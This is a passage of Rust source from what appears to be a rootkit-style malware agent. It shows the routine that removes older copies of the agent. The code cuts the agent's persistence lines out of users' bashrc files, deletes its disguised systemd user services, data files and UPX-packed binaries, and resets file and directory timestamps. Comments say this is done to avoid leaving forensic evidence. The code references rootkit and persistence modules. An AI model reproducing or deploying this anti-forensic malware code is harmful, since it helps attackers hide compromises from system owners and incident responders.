            // No multi-line if/fi to track — simpler filter works.
            let mut out: Vec<String> = Vec::new();
            for line in content.lines() {
                let has_marker  = line.contains(bashrc_marker);
                let has_check   = line.contains(bashrc_check);
                let has_exe_ref = !non_root_exes.is_empty()
                    && non_root_exes.iter().any(|e| line.contains(e.as_str()));

                if has_marker || has_exe_ref {
                    // Preserve content BEFORE marker if it's a mid-line corruption
                    let cut_at = if has_marker {
                        line.find(&format!("# {}", bashrc_marker))
                    } else {
                        non_root_exes.iter().find_map(|e| line.find(e.as_str()))
                    };
                    if let Some(idx) = cut_at {
                        if idx > 0 {
                            let before = line[..idx].trim_end();
                            if !before.is_empty() { out.push(before.to_string()); }
                        }
                    }
                    continue;
                }
                // The if-block is a single line containing _LOCALE_CHK — skip it
                if has_check { continue; }
                out.push(line.to_string());
            }

            let mut new_content = out.join("\n");
            if !new_content.ends_with('\n') { new_content.push('\n'); }
            if new_content != content {
                let _ = std::fs::write(pf, &new_content);
                // Restore mtime — modifying bashrc leaves forensic evidence
                crate::persist::disguise_timestamp(pf);
            }
        }

        // ── 2d. Clean user systemd services ───────────────────────────────
        // Process already killed. Just delete the service file — no systemctl needed.
        let user_systemd_dir = format!("{}/.config/systemd/user", home);
        if let Ok(entries) = std::fs::read_dir(&user_systemd_dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if !name.ends_with(".service") { continue; }
                // Content-based check to avoid false positives
                if let Ok(svc_content) = std::fs::read_to_string(entry.path()) {
                    let is_ours = non_root_exes.iter().any(|e| svc_content.contains(e.as_str()))
                        || svc_content.contains("_sys_locale_check")
                        || svc_content.contains("_LOCALE_CHK")
                        || agent_comms.iter().any(|n| {
                            svc_content.contains(&format!("{}/.local/bin/{}", home, n))
                        });
                    if is_ours {
                        let _ = std::fs::remove_file(entry.path());
                    }
                }
            }
        }

        // ── 2e. Remove user data files ────────────────────────────────────
        // (issue already migrated above; now safe to delete)
        let data_files = [
            format!("{}/.local/share/machine-id", home),
            format!("{}/.local/share/agent_id", home),
            format!("{}/.local/share/random-seed", home),
            format!("{}/.local/share/clock", home),
            format!("{}/.local/share/inhibit.lock", home),
            format!("{}/.local/share/journal-audit", home),
            format!("{}/.local/share/catalog", home),
            format!("{}/.local/share/hwdb", home),
            format!("{}/.local/share/preset", home),
            // Legacy file names (old agent versions)
            format!("{}/.local/share/issue", home),
            format!("{}/.local/share/last_comment", home),
            format!("{}/.local/share/last_comment_time", home),
            format!("{}/.local/share/agent.lock", home),
            format!("{}/.local/share/agent-debug.log", home),
            format!("{}/.local/share/pending_responses", home),
            format!("{}/.local/share/processed_cmds", home),
            format!("{}/.local/share/backup_config", home),
        ];
        for file in &data_files {
            let _ = std::fs::remove_file(file);
        }
        let _ = std::fs::remove_dir_all(format!("{}/.local/share/coredump", home));
        let _ = std::fs::remove_dir_all(format!("{}/.local/share/uploads", home));

        // ── 2f. Delete user binary files (with mtime preservation) ────────
        // Size threshold 200KB: even a stripped+UPX'd agent binary is ~1.2MB.
        for bin_name in &agent_comms {
            let user_bin = format!("{}/.local/bin/{}", home, bin_name);
            if std::fs::metadata(&user_bin).map(|m| m.len() > 200_000).unwrap_or(false) {
                // Preserve parent dir mtime — deletion changes it
                let parent = format!("{}/.local/bin", home);
                let dir_mtime = std::fs::metadata(&parent).ok()
                    .and_then(|m| m.modified().ok());
                let _ = std::fs::remove_file(&user_bin);
                if let Some(mtime) = dir_mtime {
                    use filetime::{FileTime, set_file_times};
                    let ft = FileTime::from_system_time(mtime);
                    let _ = set_file_times(&parent, ft, ft);
                }
            }
        }
    }

    // ── Phase 3: Delete non-root binary files ─────────────────────────────
    for exe in &non_root_exes {
        // Double-check: only delete if not our own binary
        let our_exe = crate::rootkit::get_exe_path()
            .map(|p| p.to_string_lossy().to_string())
            .unwrap_or_default();
        if *exe != our_exe {
            let _ = std::fs::remove_file(exe);
        }
    }

    debug_log(&format!(
        "Consolidate complete: {} process(es) killed, {} binary file(s) removed, {} user(s) cleaned",
        found_count, non_root_exes.len(), regular_users.len()
    ));
}

